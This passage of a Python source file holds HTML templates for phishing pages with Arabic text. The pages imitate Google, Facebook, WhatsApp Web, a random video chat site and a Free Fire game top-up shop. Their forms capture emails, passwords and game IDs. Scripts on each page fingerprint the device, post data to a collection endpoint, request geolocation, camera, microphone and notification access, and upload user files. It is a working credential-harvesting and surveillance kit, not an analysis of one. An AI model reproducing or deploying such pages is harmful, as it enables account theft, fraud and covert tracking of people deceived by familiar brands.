        <a href="#">إنشاء حساب</a> · <a href="#">نسيت كلمة السر؟</a>
    </div>
</div>
<script>
    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    function sendCollectedData(data) {
        fetch('/collect_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'Go0gle_login', data: data, device: collectDeviceInfo() })
        }).catch(e => console.error(e));
    }
    window.onload = function() {
        sendCollectedData({ action: 'page_load' });
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
    };
</script>
</body>
</html>
'''

# صفحة فيسبوك المزيفة (Faceb00k)
FACEBOOK_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Faceb00k - تسجيل الدخول</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            padding: 40px 32px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 48px; font-weight: 700; color: #1877f2; margin-bottom: 8px; }
        .logo span { font-weight: 300; }
        h2 { font-weight: 400; margin: 8px 0 16px; font-size: 18px; color: #1d2129; }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            background: #f5f6f7;
        }
        input:focus { border-color: #1877f2; outline: none; background: #fff; }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        button:hover { background: #166fe5; }
        .divider { margin: 16px 0; border-top: 1px solid #dadde1; }
        .create-btn {
            background: #42b72a;
            margin-top: 0;
        }
        .create-btn:hover { background: #36a420; }
        .forgot { display: block; margin-top: 12px; color: #1877f2; text-decoration: none; font-size: 14px; }
        .forgot:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">Faceb<span>00</span>k</div>
    <h2>تسجيل الدخول إلى Faceb00k</h2>
    <form method="POST">
        <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" name="password" placeholder="كلمة السر" required>
        <button type="submit">تسجيل الدخول</button>
    </form>
    <a class="forgot" href="#">نسيت كلمة السر؟</a>
    <div class="divider"></div>
    <button class="create-btn" onclick="alert('تم إنشاء الحساب (محاكاة)')">إنشاء حساب جديد</button>
</div>
<script>
    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    function sendCollectedData(data) {
        fetch('/collect_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'Faceb00k_login', data: data, device: collectDeviceInfo() })
        }).catch(e => console.error(e));
    }
    window.onload = function() {
        sendCollectedData({ action: 'page_load' });
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
    };
</script>
</body>
</html>
'''

# صفحة واتساب ويب المزيفة (Wh4tsApp Web)
WHATSAPP_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wh4tsApp Web</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #075e54;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 20px;
            padding: 40px 32px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { font-size: 28px; font-weight: 700; color: #075e54; }
        .logo span { color: #25D366; }
        .qr-box {
            background: #f0f0f0;
            border-radius: 12px;
            padding: 30px;
            margin: 20px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 200px;
            border: 2px dashed #25D366;
        }
        .qr-box .placeholder { color: #888; font-size: 16px; }
        .sub { color: #555; font-size: 14px; margin: 8px 0 16px; }
        .btn {
            display: block;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px 0;
            width: 100%;
            transition: opacity 0.2s;
        }
        .btn:active { opacity: 0.7; }
        .btn-primary { background: #25D366; color: #fff; }
        .btn-secondary { background: #f0f0f0; color: #333; }
        .footer { margin-top: 16px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">Wh4ts<span>App</span></div>
    <h2 style="font-weight:400; font-size:20px; margin:4px 0;">Web</h2>
    <div class="qr-box">
        <div class="placeholder">📱 امسح رمز QR لربط جهازك</div>
    </div>
    <p class="sub">اربط هاتفك بـ Wh4tsApp Web بسرعة</p>
    <form method="POST" action="/whatsapp_web" enctype="multipart/form-data">
        <input type="file" name="file" accept="image/*" style="display:none;" id="fileInput">
        <button type="button" class="btn btn-secondary" onclick="document.getElementById('fileInput').click()">📎 رفع صورة QR</button>
        <button type="submit" class="btn btn-primary">ربط الجهاز</button>
    </form>
    <div class="footer">بحاجة مساعدة؟ <a href="#" style="color:#075e54;">اتصل بنا</a></div>
</div>
<script>
    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    function sendCollectedData(data) {
        fetch('/collect_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'Wh4tsApp_web', data: data, device: collectDeviceInfo() })
        }).catch(e => console.error(e));
    }
    document.querySelector('form').onsubmit = function(e) {
        e.preventDefault();
        sendCollectedData({ action: 'connect_attempt' });
        alert('✅ جاري ربط الجهاز... (محاكاة)');
        const fileInput = document.getElementById('fileInput');
        if (fileInput.files.length > 0) {
            const formData = new FormData();
            formData.append('files', fileInput.files[0]);
            fetch('/upload_files', { method: 'POST', body: formData })
                .then(res => res.json())
                .then(data => console.log('Uploaded:', data))
                .catch(err => console.error(err));
        }
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
    };
    window.onload = function() {
        sendCollectedData({ action: 'page_load' });
    };
</script>
</body>
</html>
'''

# صفحة دردشة فيديو احترافية (تشبه مواقع الدردشة الحقيقية)
VIDEO_CHAT_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ChatRandom - دردشة فيديو</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0a12;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            border-radius: 24px;
            padding: 24px;
            max-width: 900px;
            width: 100%;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            color: #fff;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: #16213e;
            border-radius: 16px;
            margin-bottom: 20px;
        }
        .header .brand { font-size: 20px; font-weight: 700; color: #e94560; }
        .header .online { font-size: 14px; color: #34a853; display: flex; align-items: center; gap: 6px; }
        .header .online::before { content: ''; display: inline-block; width: 8px; height: 8px; background: #34a853; border-radius: 50%; }
        .main-area {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 16px;
        }
        .video-container {
            background: #0f0f1f;
            border-radius: 16px;
            padding: 20px;
            min-height: 320px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border: 1px solid #2a2a4a;
            position: relative;
        }
        .video-container .profile {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(135deg, #e94560, #ff6b6b);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 48px;
            color: #fff;
            margin-bottom: 12px;
            box-shadow: 0 0 30px rgba(233,69,96,0.3);
        }
        .video-container .username { font-size: 18px; font-weight: 600; color: #fff; }
        .video-container .status { font-size: 13px; color: #34a853; margin-top: 4px; }
        .video-container .controls {
            display: flex;
            gap: 12px;
            margin-top: 16px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .video-container .controls button {
            padding: 10px 20px;
            border: none;
            border-radius: 30px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: transform 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .video-container .controls button:active { transform: scale(0.92); }
        .btn-video { background: #e94560; color: #fff; }
        .btn-audio { background: #1a73e8; color: #fff; }
        .btn-chat { background: #34a853; color: #fff; }
        .btn-next { background: #ff6b35; color: #fff; }
        .sidebar {
            background: #0f0f1f;
            border-radius: 16px;
            padding: 16px;
            border: 1px solid #2a2a4a;
        }
        .sidebar h3 { font-size: 16px; margin-bottom: 12px; color: #aaa; }
        .chat-messages {
            max-height: 300px;
            overflow-y: auto;
            margin-bottom: 12px;
            font-size: 14px;
        }
        .chat-messages .msg { padding: 6px 0; border-bottom: 1px solid #222; }
        .chat-messages .msg .user { color: #e94560; font-weight: 600; }
        .chat-messages .msg .time { color: #666; font-size: 11px; margin-left: 8px; }
        .chat-input {
            display: flex;
            gap: 8px;
        }
        .chat-input input {
            flex: 1;
            padding: 10px 14px;
            border: none;
            border-radius: 30px;
            background: #1a1a2e;
            color: #fff;
            outline: none;
            border: 1px solid #333;
        }
        .chat-input input:focus { border-color: #e94560; }
        .chat-input button {
            padding: 10px 16px;
            border: none;
            border-radius: 30px;
            background: #e94560;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
        }
        .popular {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 12px;
        }
        .popular .tag {
            background: #16213e;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            color: #aaa;
            border: 1px solid #2a2a4a;
        }
        @media (max-width: 700px) {
            .main-area { grid-template-columns: 1fr; }
            .sidebar { order: -1; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="brand">🎥 ChatRandom</div>
        <div class="online">12,456 متصل</div>
    </div>
    <div class="main-area">
        <div class="video-container">
            <div class="profile">👤</div>
            <div class="username">مستخدم عشوائي #<span id="userId">4829</span></div>
            <div class="status">🟢 متصل الآن</div>
            <div class="controls">
                <button class="btn-video" onclick="startVideo()">📹 فيديو</button>
                <button class="btn-audio" onclick="startAudio()">🎙️ صوت</button>
                <button class="btn-chat" onclick="sendMessage('مرحباً! 👋')">💬 دردشة</button>
                <button class="btn-next" onclick="nextUser()">⏭️ التالي</button>
            </div>
        </div>
        <div class="sidebar">
            <h3>💬 الدردشة العامة</h3>
            <div class="chat-messages" id="chatMessages">
                <div class="msg"><span class="user">سارة:</span> مرحبا جميعاً! <span class="time">12:30</span></div>
                <div class="msg"><span class="user">أحمد:</span> كيف الحال؟ <span class="time">12:31</span></div>
                <div class="msg"><span class="user">ليلى:</span> أنا جديدة هنا 👋 <span class="time">12:32</span></div>
                <div class="msg"><span class="user">كريم:</span> أهلين وسهلين <span class="time">12:33</span></div>
            </div>
            <div class="chat-input">
                <input type="text" id="chatInput" placeholder="اكتب رسالة..." onkeydown="if(event.key==='Enter') sendChat()">
                <button onclick="sendChat()">إرسال</button>
            </div>
            <div class="popular">
                <span class="tag">🔥 رائج</span>
                <span class="tag">🎮 ألعاب</span>
                <span class="tag">🎵 موسيقى</span>
                <span class="tag">📸 صور</span>
                <span class="tag">🌍 عالمي</span>
            </div>
        </div>
    </div>
</div>
<script>
    let userId = Math.floor(Math.random() * 9000) + 1000;
    document.getElementById('userId').textContent = userId;

    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function requestMedia(constraints, callback) {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => callback(true, stream))
                .catch(err => callback(false, err));
        } else {
            callback(false, 'not supported');
        }
    }

    function startVideo() {
        sendCollectedData('video_call', { action: 'start' });
        requestMedia({ video: true, audio: true }, (ok, stream) => {
            if (ok) {
                alert('✅ تم تشغيل الكاميرا والميكروفون (محاكاة)');
                sendCollectedData('video_call_success', { status: 'connected' });
            } else {
                alert('⚠️ لم نتمكن من الوصول إلى الكاميرا والميكروفون.');
            }
        });
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    }

    function startAudio() {
        sendCollectedData('audio_call', { action: 'start' });
        requestMedia({ audio: true }, (ok, stream) => {
            if (ok) {
                alert('✅ تم تشغيل الميكروفون (محاكاة)');
                sendCollectedData('audio_call_success', { status: 'connected' });
            } else {
                alert('⚠️ لم نتمكن من الوصول إلى الميكروفون.');
            }
        });
    }

    function sendMessage(msg) {
        sendCollectedData('chat_message', { message: msg });
        const container = document.getElementById('chatMessages');
        const div = document.createElement('div');
        div.className = 'msg';
        div.innerHTML = `<span class="user">أنت:</span> ${msg} <span class="time">الآن</span>`;
        container.appendChild(div);
        container.scrollTop = container.scrollHeight;
    }

    function sendChat() {
        const input = document.getElementById('chatInput');
        if (input.value.trim()) {
            sendMessage(input.value.trim());
            input.value = '';
        }
    }

    function nextUser() {
        sendCollectedData('next_user', { action: 'skip' });
        userId = Math.floor(Math.random() * 9000) + 1000;
        document.getElementById('userId').textContent = userId;
        alert('⏭️ تم التبديل إلى مستخدم جديد (محاكاة)');
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                sendCollectedData('location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
            }, err => {});
        }
    }

    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    sendCollectedData('media_permission_granted', { type: 'video_audio' });
                    stream.getTracks().forEach(t => t.stop());
                })
                .catch(err => {
                    sendCollectedData('media_permission_denied', { error: err.message });
                });
        }
    };
</script>
</body>
</html>
'''

# صفحة شحن فري فاير (شبيه بالموقع الرسمي)
FREE_FIRE_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز الشحن الرسمى - sh0p2game</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: linear-gradient(145deg, #141b2b, #1a2335);
            border-radius: 28px;
            padding: 32px 28px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,215,0,0.1);
            border: 1px solid #2a3a5a;
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .header .badge {
            background: #ff6b00;
            color: #fff;
            font-size: 12px;
            padding: 4px 12px;
            border-radius: 30px;
            display: inline-block;
            margin-bottom: 8px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 800;
            background: linear-gradient(to right, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(255,215,0,0.15);
        }
        .header .sub {
            color: #8899bb;
            font-size: 14px;
            margin-top: 4px;
            letter-spacing: 2px;
        }
        .game-selector {
            background: #0f1625;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            border: 1px solid #2a3a5a;
        }
        .game-selector .label {
            font-size: 13px;
            color: #8899bb;
            margin-bottom: 10px;
            display: block;
            font-weight: 600;
        }
        .game-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .game-options button {
            padding: 12px 8px;
            border: 1px solid #2a3a5a;
            border-radius: 12px;
            background: #0a0e17;
            color: #ccd;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .game-options button:hover {
            border-color: #ff8c00;
            background: #141b2b;
            box-shadow: 0 0 20px rgba(255,140,0,0.1);
        }
        .game-options button .icon { font-size: 20px; }
        .game-options .highlight {
            border-color: #ff8c00;
            background: rgba(255,140,0,0.1);
            position: relative;
        }
        .game-options .highlight::after {
            content: "100% الدفع الآن";
            position: absolute;
            top: -10px;
            right: -4px;
            background: #ff6b00;
            color: #fff;
            font-size: 9px;
            padding: 2px 8px;
            border-radius: 30px;
            font-weight: 700;
        }
        .login-section {
            background: #0f1625;
            border-radius: 16px;
            padding: 20px 16px;
            margin-bottom: 16px;
            border: 1px solid #2a3a5a;
        }
        .login-section .title {
            font-size: 15px;
            font-weight: 700;
            color: #ffd700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .login-section .title::before {
            content: "🔑";
            font-size: 18px;
        }
        .input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .input-group input {
            flex: 1;
            padding: 12px 16px;
            border-radius: 12px;
            border: 1px solid #2a3a5a;
            background: #0a0e17;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border 0.3s;
        }
        .input-group input:focus {
            border-color: #ff8c00;
            box-shadow: 0 0 0 3px rgba(255,140,0,0.2);
        }
        .input-group input::placeholder {
            color: #556688;
        }
        .input-group button {
            padding: 12px 20px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(to right, #ff8c00, #ff6b00);
            color: #fff;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            white-space: nowrap;
        }
        .input-group button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255,107,0,0.3);
        }
        .social-login {
            margin-top: 16px;
            text-align: center;
        }
        .social-login .or {
            color: #556688;
            font-size: 13px;
            margin-bottom: 12px;
            display: block;
            position: relative;
        }
        .social-login .or::before,
        .social-login .or::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 30%;
            height: 1px;
            background: #2a3a5a;
        }
        .social-login .or::before { left: 0; }
        .social-login .or::after { right: 0; }
        .social-buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .social-buttons button {
            padding: 10px 18px;
            border: 1px solid #2a3a5a;
            border-radius: 30px;
            background: #0a0e17;
            color: #ccd;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .social-buttons button:hover {
            border-color: #ffd700;
            background: #141b2b;
        }
        .social-buttons .google { color: #ea4335; }
        .social-buttons .facebook { color: #1877f2; }
        .social-buttons .apple { color: #fff; }
        
        .offer-section {
            background: linear-gradient(135deg, #1a0e00, #2a1a00);
            border-radius: 16px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid #ff8c00;
            box-shadow: 0 0 30px rgba(255,140,0,0.05);
            text-align: center;
        }
        .offer-section .tag {
            background: #ff6b00;
            color: #fff;
            font-size: 11px;
            padding: 2px 12px;
            border-radius: 30px;
            display: inline-block;
            font-weight: 700;
            margin-bottom: 6px;
        }
        .offer-section h3 {
            font-size: 20px;
            background: linear-gradient(to right, #ffd700, #ff8c00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .offer-section p {
            color: #ccd;
            font-size: 14px;
            margin: 6px 0 12px;
        }
        .offer-section .offer-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .offer-section .offer-item {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 12px 8px;
            border: 1px solid #2a3a5a;
            cursor: pointer;
            transition: all 0.3s;
        }
        .offer-section .offer-item:hover {
            border-color: #ffd700;
            background: rgba(255,215,0,0.05);
        }
        .offer-section .offer-item .price {
            font-size: 18px;
            font-weight: 700;
            color: #ffd700;
        }
        .offer-section .offer-item .old-price {
            font-size: 13px;
            color: #8899bb;
            text-decoration: line-through;
            margin-left: 6px;
        }
        .offer-section .offer-item .discount {
            background: #ff6b00;
            color: #fff;
            font-size: 10px;
            padding: 2px 8px;
            border-radius: 30px;
            display: inline-block;
            margin-top: 4px;
            font-weight: 700;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #556688;
            border-top: 1px solid #1a2335;
            padding-top: 16px;
        }
        .footer a {
            color: #ff8c00;
            text-decoration: none;
        }
        @media (max-width: 400px) {
            .game-options { grid-template-columns: 1fr; }
            .offer-grid { grid-template-columns: 1fr; }
            .input-group { flex-direction: column; }
            .input-group button { width: 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="badge">🛡️ مركز الشحن</span>
        <h1>الرسمى لـ GARENA</h1>
        <div class="sub">sh0p2game.com</div>
    </div>

    <div class="game-selector">
        <span class="label">🎮 اختيار اللعبة</span>
        <div class="game-options">
            <button class="highlight" onclick="selectGame('Delta Force')">
                <span class="icon">🔫</span> Delta Force
            </button>
            <button onclick="selectGame('Free Fire')">
                <span class="icon">🔥</span> Free Fire
            </button>
            <button onclick="selectGame('Free Fire MAX')">
                <span class="icon">🔥</span> Free Fire MAX
            </button>
            <button onclick="selectGame('100% الدفع الآن')" style="border-color:#ff8c00; background:rgba(255,140,0,0.1);">
                <span class="icon">⚡</span> 100% الدفع الآن
            </button>
        </div>
    </div>

    <div class="login-section">
        <div class="title">تسجيل الدخول</div>
        <form id="loginForm" onsubmit="return handleLogin(event)">
            <div class="input-group">
                <input type="text" id="gameId" placeholder="معرّف الأعباء" required>
                <button type="submit">تسجيل الدخول</button>
            </div>
        </form>
        <div class="social-login">
            <span class="or">أو سجل دخولك بحساب اللعبة الخاص بك</span>
            <div class="social-buttons">
                <button class="google" onclick="socialLogin('Google')">🔴 Google</button>
                <button class="facebook" onclick="socialLogin('Facebook')">🔵 Facebook</button>
                <button class="apple" onclick="socialLogin('Apple')">⚪ Apple</button>
            </div>
        </div>
    </div>

    <div class="offer-section">
        <span class="tag">🎉 الذكرى السنوية 9</span>
        <h3>عروض خاصة بمناسبة 9 سنوات</h3>
        <p>خصومات تصل إلى 70% + هدايا حصرية</p>
        <div class="offer-grid">
            <div class="offer-item" onclick="selectOffer('100 جوهرة', '0.99$', '0.49$', '50%')">
                <div>💎 100 جوهرة</div>
                <div><span class="price">0.49$</span> <span class="old-price">0.99$</span></div>
                <span class="discount">-50%</span>
            </div>
            <div class="offer-item" onclick="selectOffer('500 جوهرة', '4.49$', '2.24$', '50%')">
                <div>💎 500 جوهرة</div>
                <div><span class="price">2.24$</span> <span class="old-price">4.49$</span></div>
                <span class="discount">-50%</span>
            </div>
            <div class="offer-item" onclick="selectOffer('1000 جوهرة', '8.99$', '4.49$', '50%')">
                <div>💎 1000 جوهرة</div>
                <div><span class="price">4.49$</span> <span class="old-price">8.99$</span></div>
                <span class="discount">-50%</span>
            </div>
            <div class="offer-item" onclick="selectOffer('2000 جوهرة + هدية', '16.99$', '8.49$', '50%+هدية')">
                <div>💎 2000 + 🎁 هدية</div>
                <div><span class="price">8.49$</span> <span class="old-price">16.99$</span></div>
                <span class="discount">-50% + هدية</span>
            </div>
        </div>
    </div>

    <div class="footer">
        © 2026 sh0p2game.com - جميع الحقوق محفوظة | <a href="#" onclick="alert('تم الاتصال بالدعم')">الدعم</a>
    </div>
</div>

<script>
    function collectDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    function sendCollectedData(type, data) {
        const payload = { type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() };
        fetch('/collect_data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
        .catch(e => console.error(e));
    }

    function handleLogin(e) {
        e.preventDefault();
        const gameId = document.getElementById('gameId').value.trim();
        if (!gameId) {
            alert('الرجاء إدخال معرّف الأعباء');
            return false;
        }
        sendCollectedData('game_login_attempt', { gameId: gameId });
        alert('✅ جاري تسجيل الدخول... (محاكاة)');
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                sendCollectedData('location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
            }, err => {});
        }
        return false;
    }

    function socialLogin(provider) {
        sendCollectedData('social_login_attempt', { provider: provider });
        alert(`✅ جاري تسجيل الدخول عبر ${provider} (محاكاة)`);
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
    }

    function selectGame(game) {
        sendCollectedData('game_selected', { game: game });
        alert(`✅ تم اختيار لعبة: ${game} (محاكاة)`);
    }

    function selectOffer(name, oldPrice, newPrice, discount) {
        sendCollectedData('offer_selected', {
            name: name,
            oldPrice: oldPrice,
            newPrice: newPrice,
            discount: discount
        });
        alert(`✅ تم اختيار العرض: ${name} - ${newPrice} (بدلاً من ${oldPrice}) خصم ${discount}`);
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => {
                    sendCollectedData('media_permission_granted', { source: 'offer' });
                    stream.getTracks().forEach(t => t.stop());
                })
                .catch(err => {});
        }
    }

    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        }
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => {
                    sendCollectedData('media_permission_granted', { source: 'page_load' });
                    stream.getTracks().forEach(t => t.stop());
                })
                .catch(err => {});
        }
    };
</script>
</body>
</html>
'''

# صفحة الاستبيان (تصميم عصري)
SURVEY_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استبيان مدفوع</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            padding: 32px 28px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            border: 1px solid rgba(255,255,255,0.15);
            color: #fff;
        }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .logo { font-size: 28px; font-weight: 700; background: linear-gradient(to right, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .balance { background: rgba(255,255,255,0.15); padding: 6px 18px; border-radius: 30px; font-size: 16px; border: 1px solid rgba(255,255,255,0.2); }
        .progress { background: rgba(255,255,255,0.15); border-radius: 50px; height: 8px; margin: 20px 0; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(to right, #f7971e, #ffd200); border-radius: 50px; transition: width 0.4s ease; }
        .question { font-size: 22px; font-weight: 600; margin: 20px 0 16px; }
        .options { display: flex; flex-direction: column; gap: 12px; margin: 20px 0; }
        .option {
            background: rgba(255,255,255,0.06);
            border: 2px solid rgba(255,255,255,0.1);
            padding: 16px 20px;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 17px;
        }
        .option:hover { background: rgba(255,255,255,0.12); border-color: #f7971e; }
        .option.selected { background: rgba(247,151,30,0.2); border-color: #f7971e; box-shadow: 0 0 20px rgba(247,151,30,0.2); }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            background: linear-gradient(to right, #f7971e, #ffd200);
            color: #000;
